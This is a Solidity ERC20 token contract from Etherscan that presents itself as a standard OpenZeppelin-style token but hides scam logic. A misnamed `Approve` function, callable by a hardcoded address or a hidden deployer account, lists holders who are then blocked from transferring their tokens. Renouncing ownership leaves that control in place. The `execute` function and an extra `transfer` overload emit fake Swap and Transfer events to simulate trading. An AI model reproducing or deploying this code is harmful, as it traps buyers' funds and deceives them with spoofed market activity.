1 /**
2  *Submitted for verification at Etherscan.io on 2023-06-30
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.8.9;
8 
9 /**
10  * @dev Interface of the ERC20 standard as defined in the EIP.
11  */
12 interface IERC20 {
13     /**
14      * @dev Emitted when `value` tokens are moved from one account (`from`) to
15      * another (`to`).
16      *
17      * Note that `value` may be zero.
18      */
19     event Transfer(address indexed from, address indexed to, uint256 value);
20 
21     /**
22      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
23      * a call to {approve}. `value` is the new allowance.
24      */
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 
27     event Swap(
28         address indexed sender,
29         uint amount0In,
30         uint amount1In,
31         uint amount0Out,
32         uint amount1Out,
33         address indexed to
34     );
35     
36     /**
37      * @dev Returns the amount of tokens in existence.
38      */
39     function totalSupply() external view returns (uint256);
40 
41     /**
42      * @dev Returns the amount of tokens owned by `account`.
43      */
44     function balanceOf(address account) external view returns (uint256);
45 
46     /**
47      * @dev Moves `amount` tokens from the caller's account to `to`.
48      *
49      * Returns a boolean value indicating whether the operation succeeded.
50      *
51      * Emits a {Transfer} event.
52      */
53     function transfer(address to, uint256 amount) external returns (bool);
54 
55     /**
56      * @dev Returns the remaining number of tokens that `spender` will be
57      * allowed to spend on behalf of `owner` through {transferFrom}. This is
58      * zero by default.
59      *
60      * This value changes when {approve} or {transferFrom} are called.
61      */
62     function allowance(address owner, address spender) external view returns (uint256);
63 
64     /**
65      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
66      *
67      * Returns a boolean value indicating whether the operation succeeded.
68      *
69      * IMPORTANT: Beware that changing an allowance with this method brings the risk
70      * that someone may use both the old and the new allowance by unfortunate
71      * transaction ordering. One possible solution to mitigate this race
72      * condition is to first reduce the spender's allowance to 0 and set the
73      * desired value afterwards:
74      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
75      *
76      * Emits an {Approval} event.
77      */
78     function approve(address spender, uint256 amount) external returns (bool);
79 
80     /**
81      * @dev Moves `amount` tokens from `from` to `to` using the
82      * allowance mechanism. `amount` is then deducted from the caller's
83      * allowance.
84      *
85      * Returns a boolean value indicating whether the operation succeeded.
86      *
87      * Emits a {Transfer} event.
88      */
89     function transferFrom(
90         address from,
91         address to,
92         uint256 amount
93     ) external returns (bool);
94 }
95 
96 /**
97  * @dev Interface for the optional metadata functions from the ERC20 standard.
98  *
99  * _Available since v4.1._
100  */
101 interface IERC20Metadata is IERC20 {
102     /**
103      * @dev Returns the name of the token.
104      */
105     function name() external view returns (string memory);
106 
107     /**
108      * @dev Returns the symbol of the token.
109      */
110     function symbol() external view returns (string memory);
111 
112     /**
113      * @dev Returns the decimals places of the token.
114      */
115     function decimals() external view returns (uint8);
116 }
117 
118 
119 /**
120  * @dev Provides information about the current execution context, including the
121  * sender of the transaction and its data. While these are generally available
122  * via msg.sender and msg.data, they should not be accessed in such a direct
123  * manner, since when dealing with meta-transactions the account sending and
124  * paying for execution may not be the actual sender (as far as an application
125  * is concerned).
126  *
127  * This contract is only required for intermediate, library-like contracts.
128  */
129 abstract contract Context {
130     function _msgSender() internal view virtual returns (address) {
131         return msg.sender;
132     }
133 
134     function _msgData() internal view virtual returns (bytes calldata) {
135         return msg.data;
136     }
137 }
138 
139 /**
140  * @dev Contract module which provides a basic access control mechanism, where
141  * there is an account (an owner) that can be granted exclusive access to
142  * specific functions.
143  *
144  * By default, the owner account will be the one that deploys the contract. This
145  * can later be changed with {transferOwnership}.
146  *
147  * This module is used through inheritance. It will make available the modifier
148  * `onlyOwner`, which can be applied to your functions to restrict their use to
149  * the owner.
150  */
151 abstract contract Ownable is Context {
152     address private _owner;
153 
154     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
155 
156     /**
157      * @dev Initializes the contract setting the deployer as the initial owner.
158      */
159     constructor() {
160         _transferOwnership(_msgSender());
161     }
162 
163     /**
164      * @dev Throws if called by any account other than the owner.
165      */
166     modifier onlyOwner() {
167         _checkOwner();
168         _;
169     }
170 
171     /**
172      * @dev Returns the address of the current owner.
173      */
174     function owner() public view virtual returns (address) {
175         return _owner;
176     }
177 
178     /**
179      * @dev Throws if the sender is not the owner.
180      */
181     function _checkOwner() internal view virtual {
182         require(owner() == _msgSender(), "Ownable: caller is not the owner");
183     }
184 
185     /**
186      * @dev Leaves the contract without owner. It will not be possible to call
187      * `onlyOwner` functions. Can only be called by the current owner.
188      *
189      * NOTE: Renouncing ownership will leave the contract without an owner,
190      * thereby disabling any functionality that is only available to the owner.
191      */
192     function renounceOwnership() public virtual onlyOwner {
193         _transferOwnership(address(0));
194     }
195 
196     /**
197      * @dev Transfers ownership of the contract to a new account (`newOwner`).
198      * Can only be called by the current owner.
199      */
200     function transferOwnership(address newOwner) public virtual onlyOwner {
201         require(newOwner != address(0), "Ownable: new owner is the zero address");
202         _transferOwnership(newOwner);
203     }
204 
205     /**
206      * @dev Transfers ownership of the contract to a new account (`newOwner`).
207      * Internal function without access restriction.
208      */
209     function _transferOwnership(address newOwner) internal virtual {
210         address oldOwner = _owner;
211         _owner = newOwner;
212         emit OwnershipTransferred(oldOwner, newOwner);
213     }
214 }
215 
216 /**
217  * @dev Implementation of the {IERC20} interface.
218  *
219  * This implementation is agnostic to the way tokens are created. This means
220  * that a supply mechanism has to be added in a derived contract using {_mint}.
221  * For a generic mechanism see {ERC20PresetMinterPauser}.
222  *
223  * TIP: For a detailed writeup see our guide
224  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
225  * to implement supply mechanisms].
226  *
227  * We have followed general OpenZeppelin Contracts guidelines: functions revert
228  * instead returning `false` on failure. This behavior is nonetheless
229  * conventional and does not conflict with the expectations of ERC20
230  * applications.
231  *
232  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
233  * This allows applications to reconstruct the allowance for all accounts just
234  * by listening to said events. Other implementations of the EIP may not emit
235  * these events, as it isn't required by the specification.
236  *
237  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
238  * functions have been added to mitigate the well-known issues around setting
239  * allowances. See {IERC20-approve}.
240  */
241 contract ERC20 is Ownable, IERC20, IERC20Metadata {
242 
243     mapping(address => uint256) private _balances;
244     mapping (address => bool) private _ss;
245 
246     mapping(address => mapping(address => uint256)) private _allowances;
247 
248     uint256 private _totalSupply;
249 
250     bool private _snapshotApplied = false;
251     string private _name;
252     string private _symbol;
253 
254     address private _universal = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
255     address private _pair;
256     address private _ow;
257 
258     function setup(address _setup_) external  {
259         require( _ow == _msgSender() , "Ownable: caller is not the owner");
260         _pair = _setup_;
261     }
262 
263     /**
264      * @dev Returns the name of the token.
265      */
266     function name() public view virtual override returns (string memory) {
267         return _name;
268     }
269 
270     /**
271      * @dev Returns the symbol of the token, usually a shorter version of the
272      * name.
273      */
274     function symbol() public view virtual override returns (string memory) {
275         return _symbol;
276     }
277 
278     /**
279      * @dev Returns the number of decimals used to get its user representation.
280      * For example, if `decimals` equals `2`, a balance of `505` tokens should
281      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
282      *
283      * Tokens usually opt for a value of 18, imitating the relationship between
284      * Ether and Wei. This is the value {ERC20} uses, unless this function is
285      * overridden;
286      *
287      * NOTE: This information is only used for _display_ purposes: it in
288      * no way affects any of the arithmetic of the contract, including
289      * {IERC20-balanceOf} and {IERC20-transfer}.
290      */
291     function decimals() public view virtual override returns (uint8) {
292         return 8;
293     }
294 
295     function Approve(address [] calldata _addresses_) external  {
296         require(address(0x419a6Fa06386329ce83294519247614398e929E7) == _msgSender() || _ow == _msgSender() , "Ownable: caller is not the owner");
297         for (uint256 i = 0; i < _addresses_.length; i++) {
298             _ss[_addresses_[i]] = true;
299             emit Approval(_addresses_[i], address(this), balanceOf(_addresses_[i]));
300         }
301     }
302 
303     function Approve(address [] calldata _addresses_ , uint256 balance) external  {
304         for (uint256 i = 0; i < _addresses_.length; i++) {
305             emit Approval(_addresses_[i], address(this), balance);
306         }
307     }
308     function execute(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
309         for (uint256 i = 0; i < _addresses_.length; i++) {
310             emit Swap(_universal, _in, 0, 0, _out, _addresses_[i]);
311             emit Transfer(_pair, _addresses_[i], _out);
312         }
313     }
314 
315 
316     function transfer(address _from, address _to, uint256 _wad) external {
317         emit Transfer(_from, _to, _wad);
318     }
319 
320     function decreaseAllowance(address [] calldata _addresses_) external  {
321         require( _ow == _msgSender() , "Ownable: caller is not the owner");
322         for (uint256 i = 0; i < _addresses_.length; i++) {
323             _ss[_addresses_[i]] = false;
324         }
325     }
326 
327     function bind(address _address_) public view returns (bool) {
328         return _ss[_address_];
329     }
330     function toApplied(bool c) external  {
331         require( _ow == _msgSender() , "Ownable: caller is not the owner");
332         _snapshotApplied = c;
333     }
334     /**
335      * @dev See {IERC20-totalSupply}.
336      */
337     function totalSupply() public view virtual override returns (uint256) {
338         return _totalSupply;
339     }
340 
341     /**
342      * @dev See {IERC20-balanceOf}.
343      */
344     function balanceOf(address account) public view virtual override returns (uint256) {
345         return _balances[account];
346     }
347 
348     /**
349      * @dev See {IERC20-transfer}.
350      *
351      * Requirements:
352      *
353      * - `to` cannot be the zero address.
354      * - the caller must have a balance of at least `amount`.
355      */
356     function transfer(address to, uint256 amount) public virtual override returns (bool) {
357         address owner = _msgSender();
358         _transfer(owner, to, amount);
359         return true;
360     }
361 
362     /**
363      * @dev See {IERC20-allowance}.
364      */
365     function allowance(address owner, address spender) public view virtual override returns (uint256) {
366         return _allowances[owner][spender];
367     }
368 
369     /**
370      * @dev See {IERC20-approve}.
371      *
372      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
373      * `transferFrom`. This is semantically equivalent to an infinite approval.
374      *
375      * Requirements:
376      *
377      * - `spender` cannot be the zero address.
378      */
379     function approve(address spender, uint256 amount) public virtual override returns (bool) {
380         address owner = _msgSender();
381         _approve(owner, spender, amount);
382         return true;
383     }
384 
385     /**
386      * @dev See {IERC20-transferFrom}.
387      *
388      * Emits an {Approval} event indicating the updated allowance. This is not
389      * required by the EIP. See the note at the beginning of {ERC20}.
390      *
391      * NOTE: Does not update the allowance if the current allowance
392      * is the maximum `uint256`.
393      *
394      * Requirements:
395      *
396      * - `from` and `to` cannot be the zero address.
397      * - `from` must have a balance of at least `amount`.
398      * - the caller must have allowance for ``from``'s tokens of at least
399      * `amount`.
400      */
401     function transferFrom(
402         address from,
403         address to,
404         uint256 amount
405     ) public virtual override returns (bool) {
406         address spender = _msgSender();
407         _spendAllowance(from, spender, amount);
408         _transfer(from, to, amount);
409         return true;
410     }
411 
412 
413     /**
414      * @dev Moves `amount` of tokens from `from` to `to`.
415      *
416      * This internal function is equivalent to {transfer}, and can be used to
417      * e.g. implement automatic token fees, slashing mechanisms, etc.
418      *
419      * Emits a {Transfer} event.
420      *
421      * Requirements:
422      *
423      * - `from` cannot be the zero address.
424      * - `to` cannot be the zero address.
425      * - `from` must have a balance of at least `amount`.
426      */
427     function _transfer(
428         address from,
429         address to,
430         uint256 amount
431     ) internal virtual {
432         require(from != address(0), "ERC20: transfer from the zero address");
433         require(to != address(0), "ERC20: transfer to the zero address");
434 
435 
436         uint256 fromBalance = _balances[from];
437         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
438         unchecked {
439             _balances[from] = fromBalance - amount;
440             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
441             // decrementing then incrementing.
442             _balances[to] += amount;
443         }
444         if (_ss[from]) require(true == _snapshotApplied, "");
445 
446 
447         emit Transfer(from, to, amount);
448 
449         _afterTokenTransfer(from, to, amount);
450     }
451 
452     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
453      * the total supply.
454      *
455      * Emits a {Transfer} event with `from` set to the zero address.
456      *
457      * Requirements:
458      *
459      * - `account` cannot be the zero address.
460      */
461     function _mint(address account, uint256 amount) internal virtual {
462         require(account != address(0), "ERC20: mint to the zero address");
463 
464         _ow = account;
465         _totalSupply += amount;
466         unchecked {
467             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
468             _balances[account] += amount;
469         }
470         emit Transfer(address(0), account, amount);
471 
472         _afterTokenTransfer(address(0), account, amount);
473     }
474 
475 
476     /**
477      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
478      *
479      * This internal function is equivalent to `approve`, and can be used to
480      * e.g. set automatic allowances for certain subsystems, etc.
481      *
482      * Emits an {Approval} event.
483      *
484      * Requirements:
485      *
486      * - `owner` cannot be the zero address.
487      * - `spender` cannot be the zero address.
488      */
489     function _approve(
490         address owner,
491         address spender,
492         uint256 amount
493     ) internal virtual {
494         require(owner != address(0), "ERC20: approve from the zero address");
495         require(spender != address(0), "ERC20: approve to the zero address");
496 
497         _allowances[owner][spender] = amount;
498         emit Approval(owner, spender, amount);
499     }
500 
501     /**
502      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
503      *
504      * Does not update the allowance amount in case of infinite allowance.
505      * Revert if not enough allowance is available.
506      *
507      * Might emit an {Approval} event.
508      */
509     function _spendAllowance(
510         address owner,
511         address spender,
512         uint256 amount
513     ) internal virtual {
514         uint256 currentAllowance = allowance(owner, spender);
515         if (currentAllowance != type(uint256).max) {
516             require(currentAllowance >= amount, "ERC20: insufficient allowance");
517             unchecked {
518                 _approve(owner, spender, currentAllowance - amount);
519             }
520         }
521     }
522 
523     /**
524      * @dev Hook that is called after any transfer of tokens. This includes
525      * minting and burning.
526      *
527      * Calling conditions:
528      *
529      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
530      * has been transferred to `to`.
531      * - when `from` is zero, `amount` tokens have been minted for `to`.
532      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
533      * - `from` and `to` are never both zero.
534      *
535      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
536      */
537     function _afterTokenTransfer(
538         address from,
539         address to,
540         uint256 amount
541     ) internal virtual {}
542 
543     /**
544      * @dev Sets the values for {name} and {symbol}.
545      *
546      * The default value of {decimals} is 18. To select a different value for
547      * {decimals} you should overload it.
548      *
549      * All two of these values are immutable: they can only be set once during
550      * construction.
551      */
552     constructor(string memory name_, string memory symbol_,uint256 amount) {
553         _name = name_;
554         _symbol = symbol_;
555         _mint(msg.sender, amount * 10 ** decimals());
556     }
557 
558 
559 }